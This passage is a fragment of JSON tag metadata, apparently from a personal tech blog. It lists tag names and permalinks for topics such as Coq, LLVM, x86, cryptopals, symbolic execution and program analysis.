of","slug":"Best-of","permalink":"http://raywang.tech/tags/Best-of/"},{"name":"Coq","slug":"Coq","permalink":"http://raywang.tech/tags/Coq/"},{"name":"LLVM","slug":"LLVM","permalink":"http://raywang.tech/tags/LLVM/"},{"name":"x86","slug":"x86","permalink":"http://raywang.tech/tags/x86/"},{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"},{"name":"Symbolic Execution","slug":"Symbolic-Execution","permalink":"http://raywang.tech/tags/Symbolic-Execution/"},{"name":"Program Analysis","slug":"Program-Analysis","permalink":"http://raywang.tech/tags/Program-Analysis/"},{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/tags/TechSec/"},{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]}